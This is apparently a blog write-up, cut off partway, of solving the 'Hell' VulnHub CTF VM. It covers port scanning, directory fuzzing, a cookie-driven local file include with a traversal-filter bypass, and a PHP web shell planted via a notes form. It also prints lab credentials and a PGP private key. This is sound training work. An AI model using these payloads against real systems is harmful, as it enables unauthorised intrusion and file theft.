---
categories:
- CTF
- Vulnerable VM
- Solution
- Challenge
comments: true
date: 2014-07-20T19:00:46Z
title: Hell would just not freeze over!
---

##foreword
Lets start by saying that this is probably one of the toughest boot2root's I have tried thus far. Even though I have managed to get `/root/flag.txt`, I am yet to actually *root* this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a **TON** of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get **root**, I'll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)

<!--more-->

## welcome to hell
[Hell](http://vulnhub.com/entry/hell-1,95/) is another vulnerable VM hosted at [@VulnHub](https://twitter.com/vulnhub). After recently completing the [SkyTower](https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/) Vulnerable VM, I was feeling up to the challenge of a potentially more challenging VM. And boy, was it challenging... The wife was away on a _girls weekend out_, so I had plenty of time to sit and really think about things without distractions.

## the usual first steps
So, like most other CTF type VM's, the natural first approach is to get the VM up and running, get the network connected and fire off a NMAP port scan to see what we got. I decided to use a Kali Linux VM to attack this vulnerableVM. The IP for the Hell VM was 192.168.56.102:

```bash
root@kali:~# nmap --reason 192.168.56.102

Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-20 19:15 SAST
Nmap scan report for 192.168.56.102
Host is up, received reset (0.00025s latency).
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
111/tcp open  rpcbind syn-ack
666/tcp open  doom    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds
```
So tcp/22, tcp/80 (kinda expected that), tcp/111 and then the first _whaaat_ moment, tcp/666.

## poking around
The tcp/666 was the first unusual thing so I decided to check this out first. A telnet to 192.168.56.102 on port 666 resulted in:

```bash
root@kali:~# telnet 192.168.56.102 666
Trying 192.168.56.102...
Connected to 192.168.56.102.
Escape character is '^]'.

Welcome to the Admin Panel
Archiving latest version on webserver (echoserver.bak)...
Starting echo server and monitoring...
ping
ping
pong
pong
^]quit

telnet> quit
Connection closed.
```

The line _'Archiving latest version on webserver (echoserver.bak)...'_ hints towards the fact that we may be able to get this server software via the webserver. Other than that, the session appears to simply echo whatever I input. I toyed around with random inputs but the echoserver did not appear to be too upset about.

## the echo server
From the banner received with the service running on tcp/666, I browsed to the webserver root and made a request to `echoserver.bak`:

```bash
root@kali:~# curl  "http://192.168.56.102/echoserver.bak" > echoserver.bak
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7846  100  7846    0     0  1290k      0 --:--:-- --:--:-- --:--:-- 1532k
root@kali:~# file echoserver.bak
echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xccc6d0e8b14d50e98b07025d5eb9e496a22a8e10, not stripped
```

Now I will admit, this file kept me busy for a very long time. One would try something, google something, try something, goole something, just to get sucked in and lost in a never ending tunnel of binary exploitation & analysis.
To sum up, one would start the echo server up locally, which opens a socket on tcp/666. I'd then telnet to 127.0.0.1:666 and fuzz. Running the echoserver with a `strace`, one will notice the server 'dying' when a socket is closed:

```bash
bind(3, {sa_family=AF_INET, sin_port=htons(666), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 10)                           = 0
accept(3, 0, NULL)                      = 4
read(4, "test\r\n", 2000)               = 6
write(4, "test\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 1500) = 1500
read(4, "", 2000)                       = 0
write(4, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 1500) = 1500
read(4, "", 2000)                       = 0
write(4, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 1500) = -1 EPIPE (Broken pipe)
--- SIGPIPE (Broken pipe) @ 0 (0) ---
+++ killed by SIGPIPE +++
```

Eventually I decided to leave the echoserver alone and move on to the web server.

## the web server
Web hacking is generally more familiar for me. Initially the web server did not reveal anything interesting. That is until you view the `robots.txt`:

```bash
root@kali:~# curl http://192.168.56.102/robots.txt
User-agent: *
Disallow: /personal/
Disallow: /super_secret_login_path_muhahaha/
```

The folder `personal/` had a g0tmi1lk (founder of VulnHub) fansite detailing that it is being built by Jack and will be live soon. Other than that, nothing particularly interesting. `super_secret_login_path_muhahaha` however, presented us with a login portal with a title **Admin**.

The login form posted to `login.php`, and on failure would 302 to: `http://192.168.56.102/super_secret_login_path_muhahaha/index.php?the_user_is_a_failure=1`. Fuzzing `the_user_is_a_failure` simply appeared to flip the Login Failed message. Manual and automated test with sqlmap also failed. Sooo, it was time to enumerate some more.

The next move was to fuzz more directories and maybe some interesting files. I decided on `wfuzz` for this. I used the medium wordlist for the sake of time, and tried for some folders and files in both the known and unknown directories:

```bash
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ
Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt

Total requests: 3036
==================================================================
ID Response   Lines      Word         Chars          Request
==================================================================

00013:  C=200      7 L        11 W       88 Ch    " - 1"
02780:  C=200   5606 L     35201 W    1028165 Ch     " - server"
```

Adding `.php` to the end of my fuzz keyword revealed some more interesting files:

```bash
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt

Total requests: 3036
==================================================================
ID Response   Lines      Word         Chars          Request
==================================================================

01375:  C=200     17 L        33 W      371 Ch    " - index"
01663:  C=302      0 L         0 W        0 Ch    " - login"
01684:  C=200      5 L        19 W      163 Ch    " - mail"
02009:  C=302     21 L        38 W      566 Ch    " - panel"
02076:  C=302     17 L        35 W      387 Ch    " - personal"
02439:  C=200      7 L        21 W      170 Ch    " - server"
02852:  C=200      2 L         2 W       19 Ch    " - users"
```

So this gives us slightly more to work with. All of the above are relative to `super_secret_login_path_muhahaha`.
`/1` was a big red **INTRUDER ALERT** message, and `/server` was a gif of a server rack falling over.

From the .php file side of things, it was slightly more interesting.

## 302 content anyone?
I was already aware of `index.php` as well as `login.php` due to the root of the login directory revealing this. The rest of the items I browsed using the Iceweasal browser in Kali Linux. The results were:

  - `mail.php` was a page showing us that we have received _2_ emails, and that the 'firewall' is activated. There was also what I think is a spam filtering dog gif ;)
  - `panel.php` simply redirected you back to `index.php`. Assuming there is a auth requirement here.
  - `personal.php` also simply redirected you back to `index.php`. Again, assuming a auth requirement.
  - `server.php` had the gif we saw in `/server` with some humorous test with it. Nothing really of interest.
  - `users.php` just returned the words _Jack_. This is the same user mentioned in the shrine page from `/personal/`.

Due to these auth requirements, I decided to take all of these url's to `curl`, and inspect the cookies, headers etc. that were being sent around. Maybe this will hint towards something useful. The command used for the investigations was:

```bash
root@kali:~# curl -L -v http://192.168.56.102/super_secret_login_path_muhahaha/index.php -c cookies -b cookies
<HTML>
<FORM name="login" method="post" action="login.php">
<CENTER>
<H1> Admin </H1>
<H3>
<STRONG>Username:</STRONG>
<INPUT name="username" id="username" type="text" value=""/>
<BR>
<BR>
<STRONG>Password:</STRONG>
<INPUT name="password" id="password" type="password" value=""/>
<BR>
<BR>
<INPUT name="mysubmit" id="mysubmit" type="submit" value="Login"/>
</H3>
</HTML>
```

Here I am telling curl to make a `GET` request to http://192.168.56.102/super_secret_login_path_muhahaha/index.php, using a cookies file called `cookies` when making the request (-b flag), and storing any cookies received in the same file (-c flag). I am also telling it to follow redirects in the case of `302`'s, and be verbose with output so that I can see the headers. Requesting `index.php` resulted in a cookie jar of:

```bash
root@kali:~# cat cookies
# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by libcurl! Edit at your own risk.

192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
```

Great. So I used this on all of the enumerated scripts, carefully checking for anything that would stand out. This part definitely took me some time to realize, but I finally saw the gem when I made a request to `personal.php`:

```bash
root@kali:~# curl -v -L http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
* About to connect() to 192.168.56.102 port 80 (#0)
*   Trying 192.168.56.102...
* connected
* Connected to 192.168.56.102 (192.168.56.102) port 80 (#0)
> GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
> User-Agent: curl/7.26.0
> Host: 192.168.56.102
> Accept: */*
> Cookie: PHPSESSID=8u300rbb0747fi6iocm0lt4310
>
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 302 Found
< Date: Sun, 20 Jul 2014 07:48:17 GMT
< Server: Apache/2.2.22 (Debian)
< X-Powered-By: PHP/5.4.4-14+deb7u11
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Location: index.php
< Vary: Accept-Encoding
< Content-Length: 387
< Content-Type: text/html
<
* Ignoring the response-body     # WAIT A SEC...
* Connection #0 to host 192.168.56.102 left intact
* Issue another request to this URL: 'http://192.168.56.102/super_secret_login_path_muhahaha/index.php'
* Re-using existing connection! (#0) with host (nil)
* Connected to (nil) (192.168.56.102) port 80 (#0)
> GET /super_secret_login_path_muhahaha/index.php HTTP/1.1
```

Look at line 25. _Ignoring the request-body_. But we got a 302? Ok lets make another request without the `-L` flag and check if it reveals anything:

```bash
root@kali:~# curl -v http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
* About to connect() to 192.168.56.102 port 80 (#0)
*   Trying 192.168.56.102...
* connected
* Connected to 192.168.56.102 (192.168.56.102) port 80 (#0)
> GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
> User-Agent: curl/7.26.0
> Host: 192.168.56.102
> Accept: */*
> Cookie: PHPSESSID=8u300rbb0747fi6iocm0lt4310
>
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 302 Found
< Date: Sun, 20 Jul 2014 07:54:07 GMT
< Server: Apache/2.2.22 (Debian)
< X-Powered-By: PHP/5.4.4-14+deb7u11
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Location: index.php
< Vary: Accept-Encoding
< Content-Length: 387
< Content-Type: text/html
<
<HTML>
<FORM name="login" method="post" action="check.php">
<CENTER>
<H1> Personal Folder Login </H1>
<H3>
<STRONG>Username:</STRONG>
<INPUT name="username" id="username" type="text" value=""/>
<BR>
<BR>
<STRONG>Password:</STRONG>
<INPUT name="password" id="password" type="password" value=""/>
<BR>
<BR>
<INPUT name="mysubmit" id="mysubmit" type="submit" value="Login"/>
</H3>
</HTML>

* Connection #0 to host 192.168.56.102 left intact
* Closing connection #0
```

Well what do you know. We get a 302 and content. This time we have a login form that posts to `check.php`. A `GET` request to `check.php` resulted in a 302, but to `personal.php` and not `index.php`.

`panel.php` had similar behavior. Showing content even though we got a 302. The output for `panel.php`:

```html
<HTML>
<CENTRE>
<H2> Folders </H2>
<TABLE style="width:700px" align="center">
<TR>
   <TD><A HREF="server.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="mail.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="users.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="personal.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="notes.php"><IMG SRC='folder.png'></A></TD>
</TR>
<TR>
   <TD><H4>Server Status</H4></TD>
   <TD><H4>Mail Status</H4></TD>
   <TD><H4>Auth Users</H4></TD>
   <TD><H4>Personal Folder</H4></TD>
   <TD><H4>Notes</H4></TD>
</TR>
</CENTRE>
</HTML>
```

Here we have another script, `notes.php` revealed. Browsing to `notes.php`, we are presented with a input field with a _Write Note_ button, and a message stating: _"note.txt stored to temporary storage upon submission"_. I guessed this temporary storage is most probably /tmp. Posting to notes.php did not yield any input and I figured this was part of something to come later.

## finding the web vuln
Ok we have come this far and you still reading? :O Just a little more and all will be revealed I promise.

Back to `check.php`, it was time to check for any potential SQL injection on the post to `check.php` from the login form. Nope. Nothing like that. However, while messing around I noticed that this script was setting a new cookie `failcount`. failcount would increment with every incorrect login to `check.php`. After *3* failed attempts, another cookie called `intruder` was set:

```bash
Added cookie intruder="1" for domain 192.168.56.102, path /super_secret_login_path_muhahaha/, expire 0
> Cookie: intruder=1; failcount=4; PHPSESSID=8u300rbb0747fi6iocm0lt4310
```

Again I will admit this did not jump right out at me. In fact it took quite a few more requests to finally puzzle it together. However, I finally nailed it when a request without the -L (follow redirects) flag was set for `panel.php`:

```bash
<HTML>
<CENTRE>
<H2> Folders </H2>
<TABLE style="width:700px" align="center">
<TR>
   <TD><A HREF="server.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="mail.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="users.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="personal.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="notes.php"><IMG SRC='folder.png'></A></TD>
</TR>
<TR>
   <TD><H4>Server Status</H4></TD>
   <TD><H4>Mail Status</H4></TD>
   <TD><H4>Auth Users</H4></TD>
   <TD><H4>Personal Folder</H4></TD>
   <TD><H4>Notes</H4></TD>
</TR>
</CENTRE>
<HTML>
<CENTER>
<FONT COLOR = "RED">
<H1>INTRUDER ALERT!</H1>
</FONT>
</CENTER>
</HTML>
</HTML>
```

Notice the familiar **INTRUDER ALERT** message? :) Also remember how this file was called `/1` from the previous enumeration? Yep! File Include time! With us having a cookiejar file called `cookies` available for editing, it was easy to play around with this. The normal cookiejar had:

```bash
root@kali:~# cat cookies
# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by libcurl! Edit at your own risk.

192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder 1
```

To test the file include, the first knee jerk reaction was to replace the `1` with `/etc/passwd`. This yielded no results, and immediately I feared failure and assumptions disappointing me. However, just to make sure, I replaced it again with something in the same path as `/1`, like `mail.php`:

```bash
root@kali:~# cat cookies
# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by libcurl! Edit at your own risk.

192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder ./mail.php

root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies

<HTML>
<CENTRE>
<H2> Folders </H2>
<TABLE style="width:700px" align="center">
<TR>
   <TD><A HREF="server.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="mail.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="users.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="personal.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="notes.php"><IMG SRC='folder.png'></A></TD>
</TR>
<TR>
   <TD><H4>Server Status</H4></TD>
   <TD><H4>Mail Status</H4></TD>
   <TD><H4>Auth Users</H4></TD>
   <TD><H4>Personal Folder</H4></TD>
   <TD><H4>Notes</H4></TD>
</TR>
</CENTRE>
<HTML>
<H3> Email's recieved in the last 24 hours: </H3>2<BR>
<H3> Current Status: Firewall Activated </H3><BR>
<IMG SRC="http://i.imgur.com/JjipeOj.gif">
</HTML>
</HTML>
```

YES. It **does** work! We have the same output added to the `panel.php` output as we would have if we browsed directly to `mail.php`. By now the assumption was that the code had something like:

```php
if ($_COOKIE['intruder']) {
   include($_COOKIE['intruder']);
}
```

...with some kind of filtering preventing reading the `/etc/passwd`. While I was still pretty excited about finding this vuln, I soon came across [this](https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)#Gray_Box_testing_and_example) article detailing potential ways of bypassing directory traversal vulnerabilities. After reading this I promptly changed the `intruder` cookie to `....//....//....//....//....//etc/passwd` and viola! :)

```bash
root@kali:~# cat cookies
# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by libcurl! Edit at your own risk.

192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder ....//....//....//....//....//etc/passwd

root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies

<HTML>
<CENTRE>
<H2> Folders </H2>
<TABLE style="width:700px" align="center">
<TR>
   <TD><A HREF="server.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="mail.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="users.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="personal.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="notes.php"><IMG SRC='folder.png'></A></TD>
</TR>
<TR>
   <TD><H4>Server Status</H4></TD>
   <TD><H4>Mail Status</H4></TD>
   <TD><H4>Auth Users</H4></TD>
   <TD><H4>Personal Folder</H4></TD>
   <TD><H4>Notes</H4></TD>
</TR>
</CENTRE>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
george:x:1000:1000:george,,,:/home/george:/bin/bash
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
jack:x:1001:1001::/home/jack:/bin/sh
milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
developers:x:1003:1003::/home/developers:/bin/sh
bazza:x:1004:1004::/home/bazza:/bin/sh
oj:x:1005:1005::/home/oj:/bin/sh
</HTML>
root@kali:~#
```

YEAH. That felt pretty darm good! Obviously not knowing all the steps needed to complete this VM, I figured I had come a pretty long way to finding the pot of gold. (Note the users in this file for later) During the enumeration I took a chance to include `/root/flag.txt`:

```bash
root@kali:~# cat cookies
# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by libcurl! Edit at your own risk.

192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder ....//....//....//....//....//root/flag.txt

root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies

<HTML>
<CENTRE>
<H2> Folders </H2>
<TABLE style="width:700px" align="center">
<TR>
   <TD><A HREF="server.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="mail.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="users.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="personal.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="notes.php"><IMG SRC='folder.png'></A></TD>
</TR>
<TR>
   <TD><H4>Server Status</H4></TD>
   <TD><H4>Mail Status</H4></TD>
   <TD><H4>Auth Users</H4></TD>
   <TD><H4>Personal Folder</H4></TD>
   <TD><H4>Notes</H4></TD>
</TR>
</CENTRE>
Congratulations of beating Hell.

I hope you enjoyed it and there weren't to many trolls in here for you.

Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242

Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de


</HTML>
root@kali:~#
```

And bingo. _Technically_ we finished what the original goal was, though, re-reading the original entry on Vulnhub, I was almost certain this was not the only way to get to this. Maybe a bug on the original release of the VM? I don't know.
From here on onwards, the goal was no longer to read `/root/flag.txt`. No, we now have to root this VM :)

## gaining shell

With the focus slightly shifting, and our ability to read files off the file system, the next natural step was to attempt to get command execution on the VM. Remembering the `notes.php` file, I decided to try include `/tmp/note.txt`. This worked just fine and echoed my testing attempts from earlier. So with this information, I simply went back to `notes.php`, entered: `<?php print_r(shell_exec($_GET['c'])); ?>`, and submitted the form. Next I edited the cookiejar to include `/tmp/notes.txt`, and proceeded to test my command execution:

```bash
root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=id -c cookies -b cookies
[snip]
</CENTRE>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</HTML>
root@kali:~#
```

Yay :) With this confirmed working, I modified the command exec request slightly so that commands with potentially strange characters are correctly encoded etc:

```bash
curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=$(echo -n “ls -lah” | python -c "import urllib, sys; print urllib.quote(''.join(sys.stdin));") -c cookies -b cookies
```

## becoming jack
With command execution, it was easy to start enumerating as much as possible about the VM. At least as much as the `www-data` user has access to, which is generally quite a lot.

I looked at the source files for the website out of curiosity about the filtering etc that was going on. I stumbled upon some MySQL credentials in `login.php`:

```php
// mysql_connect("127.0.0.1", "Jack", "zgcR6mU6pX") or die ("Server Error"); I'll change this back once development is done. Got sick of typing my password.
mysql_connect("127.0.0.1", "www-data", "website") or die("Server Error");
```

The comment was quite helpful along with all the mentions of Jack on the website, along with the `/etc/passwd` revealing a `jack` user, I tried these credentials on a SSH session:

```bash
root@kali:~# ssh jack@192.168.56.102
jack@192.168.56.102's password:
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Sun Jul 20 04:29:06 2014 from 192.168.56.1
$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
$
```

Well that was easy... With this shell, I also checked out the MySQL database to see if there is any interesting information:

```bash
$ mysql -uwww-data -pwebsite
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10320
Server version: 5.5.37-0+wheezy1 (Debian)

Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| website            |
+--------------------+
2 rows in set (0.00 sec)

mysql> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_website |
+-------------------+
| users             |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----------+-----------+
| username | password  |
+----------+-----------+
| Jack     | g0tmi1k69 |
+----------+-----------+
1 row in set (0.00 sec)

mysql>
```

Alrighty. I made a note about the credentials we have associated with 'Jack' so far. I also tested these credentials on the website, just to get a feel of what the site was actually supposed to do :P

## becoming milk_4_life
Jack had a `.pgp` folder with a private key stored in hes home directory.

```bash
$ pwd
/home/jack/.pgp

$ ls -lah
total 20K
drwx------ 2 jack jack 4.0K Jun 18 12:35 .
drwx------ 4 jack jack 4.0K Jun 22 18:28 ..
-rwx------ 1 jack jack   39 Jun 18 12:35 note
-rwx------ 1 jack jack 1.8K Jun 18 12:20 pgp.priv
-rwx------ 1 jack jack  890 Jun 18 12:24 pgp.pub

$ cat pgp.priv
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: BCPG C# v1.6.1.0

lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o
u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR
lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil
54J+LN7se3jKuFcRM+i9TF08hsTtM6azl7X4yyEDhHcvWgFY/vyggEwe6/ZP1IKG
zzAWi0sx7tlZLxyr9AFSXLwLvbhUpR3M5rJBABEBAAH/AwMC8ht700SVD+1guMSO
NKMnwLvKkrmW32b/zo/x4g4MbhUs1BXIvHfGw1ArsEpkMucb8utDqGzcwctR00de
jTr/nFo0gKxBMgc34e9HNTI0iFlVYWDFZqU4ie6/Pyt8qvZHOe5Aq0qPsCkcdMME
bR6EQng1ZBXX7zHCF2TobPnIxp5CGI2WUwXmXaGQS/hRriIcAhDx5ZFFqOdVQWES
mLo5Rd205/M4mungbUvwrHayu6ZGume+VXs630YaacNiBFpXnPDfKOCipZ+EhYsz
7febMxXj3mANwLXQfyTZOIXPzMptE11fbDA8jpy9m0vMy5ZCpJnp/VoTaaUxMz45
OeUI9nKTx9P1lGPC9hYidshg3Sg5Iz/qqmL/byAv1bUV2YOdJlAS1XY9Jj/wNrYz
yG9ASw5nfp0ChhLYnnU4dgfEk5bajGvgnhZAlb/+yNvJ5eUcwivjFC8jJUwlrZ+Z
oj1XAC4148JsjcQHW1d7yONc4iI7tSubMNa5GfBal1BxMRLP3nSZ4ICl67gTjrKH
ztiMKAefip3ywnRomfn7q9raJQ8TsKp0+REVy05mhZMZ1AdMlZzhTz8cYy8II6yr
qSxuJARfJ95FGYPrASMfJ+aZfPNk5RDnH5d92vxm/nIWexdayZqqQJG4MzOhtrjx
a0YouqQhxvD2aKslEBJ1S/D4D40xkVI+oaI+aM/6X+XzC2XVJgm7G8FvmtE09BUm
fAMUxE/bgsv33QXsURtelfuoZRLz/OmwybXpwv+Zen0n8hpjQEAOhqD4eieIxH9j
7W6ijInh9XD8jcnUa4eHw7WDa0LPtyQSbPZB1hZou6z8pAZY0LxhmstpPjSYfdKR
HRjhRuu0tdZ2PrKx1wKooo/iiJdZ0Cgizlu4k76rDrQSamFja0Bjb3dsb3ZlcnMu
Y29tiQEcBBABAgAGBQJToPb/AAoJEL26wSU/GKsKnk0H/iWvOGuWwge8VteqxPip
yu2LwvLzjbHAeWwBmsg69h+Yl5l8Y+3B9aoCpnjM2QmMAFHxVA8L6Z4UIyhNJ90Y
l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK
vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh
zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
tqg=
=SCkw
-----END PGP PRIVATE KEY BLOCK-----
$
```

There was also a note in the directory:

```bash
$ cat note
The usual password as with everything.
```

With all this information now known to us, and the fact that I know PGP is pretty popular to encrypt files and sign mail, I figured we had to get this key loaded and decrypt something using it. Further enumeration revealed that `/var/mail` was world readable:

```bash
$ pwd
/var/mail/jack/received
$ ls -lah
total 12K
drwxr-sr-x 2 root mail 4.0K Jun 18 12:26 .
drwxr-sr-x 3 jack jack 4.0K Jul  5 19:56 ..
-rw-r--r-- 1 root mail  709 Jun 18 12:26 message.eml
$ cat message.eml
-----BEGIN PGP MESSAGE-----
Version: BCPG C# v1.6.1.0

hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
